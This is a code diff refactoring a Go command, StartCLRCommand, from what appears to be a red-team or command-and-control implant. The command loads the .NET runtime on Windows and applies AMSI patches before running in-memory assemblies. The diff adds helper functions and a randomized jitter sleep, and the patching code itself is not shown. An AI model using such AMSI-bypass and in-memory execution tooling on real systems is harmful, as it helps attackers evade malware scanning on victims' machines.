@@ -43,22 +43,14 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 
 	// Ensure we're on Windows
 	if runtime.GOOS != "windows" {
-		return structs.CommandResult{
-			Output:    "Error: This command is only supported on Windows",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: This command is only supported on Windows")
 	}
 
 	// Parse parameters (default to "None" if empty/missing for backward compat)
 	var params StartCLRParams
 	if task.Params != "" {
 		if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error parsing parameters: %v", err)
 		}
 	}
 	if params.AmsiPatch == "" {
@@ -92,17 +84,13 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 			}
 			if strings.Contains(loadErr.Error(), "cannot find the file") {
 				output += fmt.Sprintf("[*] CLR load attempt %d: transient error, retrying...\n", attempt)
-				time.Sleep(500 * time.Millisecond)
+				jitterSleep(300*time.Millisecond, 700*time.Millisecond)
 				continue
 			}
 			break // Non-transient error, stop retrying
 		}
 		if loadErr != nil {
-			return structs.CommandResult{
-				Output:    output + fmt.Sprintf("Error initializing CLR: %v", loadErr),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorResult(output + fmt.Sprintf("Error initializing CLR: %v", loadErr))
 		}
 		// Store in shared state so inline-assembly can reuse this runtime host
 		runtimeHost = host
@@ -223,11 +211,7 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 		output += "\n[+] CLR initialized and patches applied. Ready for assembly execution."
 	}
 
-	return structs.CommandResult{
-		Output:    output,
-		Status:    "completed",
-		Completed: true,
-	}
+	return successResult(output)
 }
 
 // loadAMSI explicitly loads amsi.dll into the process
